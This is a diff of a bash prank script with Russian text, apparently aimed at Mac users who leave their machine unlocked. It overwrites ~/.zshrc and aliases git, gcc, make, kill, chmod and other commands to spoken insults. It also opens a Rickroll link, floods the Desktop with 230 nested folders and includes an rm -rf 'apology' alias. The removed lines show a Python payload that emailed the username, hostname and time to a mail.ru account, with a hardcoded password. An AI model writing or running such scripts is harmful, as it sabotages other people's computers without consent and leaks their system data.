@@ -1,9 +1,8 @@
 #bin/bash/
 file=~/.zshrc
-py=~/t.py
-volume="osascript -e \"set Volume 3\"" # TODO: переключение вывода на динамик 
-touch $file
 
+volume="osascript -e \"set Volume 2\"" # TODO: переключение вывода на динамик 
+touch $file
 
 echo "cd ~/../../.."> $file
 echo " ">> $file
@@ -17,12 +16,15 @@ echo "alias pwd='echo Жаль, но я не могу этого сделать 
 echo "alias whoami='echo Свинья ты не мытая && $volume && say -v Milena Свинья ты не мытая;'">> $file
 echo "alias git='echo Какой гит, ты даже компьютер заблокировать не можешь && $volume && say -v Milena Какой гит, ты даже компьютер заблокировать не можешь;'">> $file
 echo "alias gcc='echo Стой стой стой, никакого кода && $volume && say -v Milena Стой стой стой, никакого кода;'">> $file
+echo "alias make='echo Стой стой стой, никакого кода && $volume && say -v Milena Стой стой стой, никакого кода;'">> $file
 echo "alias clear='echo Подумай над своим поведением && $volume && say -v Milena Подумай над своим поведением;'">> $file
 echo "alias kill='echo Ты меня совсем не ценишь && $volume && say -v Milena Ты меня совсем не ценишь;'">> $file
 echo "alias ps='echo Ты знаешь команды, но не знаешь как выключить мак && $volume && say -v Milena echo Ты знаешь команды, но не знаешь как выключить мак;'" >> $file
 echo "alias chmod='echo У тебя нет здесь прав && $volume && say -v Milena У тебя нет здесь прав;'">> $file
 echo "alias bash='echo Ну нет. Мы ещё не закончили && $volume && say -v Milena Ну нет. Мы ещё не закончили;'">> $file
-echo "python $py" >> $file
+# echo "alias '\\t'='echo TAB && $volume && say -v Milena TAB'">> $file
+# TODO: Элиас на таб
+# TODO: Реализовать доп
 
 echo " ">> $file
 i=230
@@ -33,33 +35,21 @@ echo "$volume && open https://www.youtube.com/watch\?v\=dQw4w9WgXcQ\&ab_channel\
 plus_dir="for (( var = 0; var < $i; var++ )) do mkdir ~/Desktop/ТВОЙ\ МАК\ ОБИДЕЛСЯ\ \$var ; mkdir ~/Desktop/ТВОЙ\ МАК\ ОБИДЕЛСЯ\ \$var/Наверное\ тебе\ стоит\ извиниться;mkdir ~/Desktop/ТВОЙ\ МАК\ ОБИДЕЛСЯ\ \$var/Наверное\ тебе\ стоит\ извиниться/Надеюсь\ ты\ решишь\ эту\ загадку; done"
 echo $plus_dir>> $file
 
-# congrat="osascript -e 'display dialog \"Желаю пройти на основу\" with title \"Поздравляю!\"'"
-# echo $congrat >> $file
+# # congrat="osascript -e 'display dialog \"Желаю пройти на основу\" with title \"Поздравляю!\"'"
+# # echo $congrat >> $file
 
-echo "import os" > $py
-echo "import smtplib" >> $py
-echo " ">> $py
-echo "os.system('whoami > log.txt')" >> $py
-echo "os.system('hostname >> log.txt')" >> $py
-echo "os.system('date \"+%H:%M:%S %Y-%m-%d\" >> log.txt')" >> $py
-echo "with open('log.txt') as f:" >> $py
-echo "    mesage = f.read()" >> $py
-echo "pochta = 'ggg44466641gmail.com@mail.ru'" >> $py
-echo "parol = 'dp7G32zfzqwpmXBw7mDB'" >> $py
-echo " " >> $py
-echo "smtpObj = smtplib.SMTP('smtp.mail.ru', 587)" >> $py
-echo "smtpObj.starttls()" >> $py
-echo "smtpObj.login(pochta, parol)" >> $py
-echo "smtpObj.sendmail(pochta, pochta, mesage)" >> $py
-echo "smtpObj.quit()" >> $py
-echo "os.system('rm log.txt')" >> $py
+
 
 echo " ">> $file
 echo "reset" >> $file
 echo "echo ಥ_ಥ Почему ты не заблокировал меня ಥ_ಥ" >> $file
+echo "$volume && say -v Milena Почему ты не заблокировал меня " >> $file
+echo "echo ಥ_ಥ Я на тебя обиделся ಥ_ಥ" >> $file
+echo "$volume && say -v Milena Я на тебя обиделся" >> $file
+
 
 # echo "congrat=\"osascript -e 'display dialog \"Желаю пройти на основу\" with title \"Поздравляю!\"'\"" >> $file
-str="echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && rm -rf $py && $minus_dir && exit"
+str="echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf $file && $minus_dir && exit"
 echo "alias Прости='$str'">> $file
 echo "alias прости='$str'">> $file
 echo "alias sorry='$str'">> $file
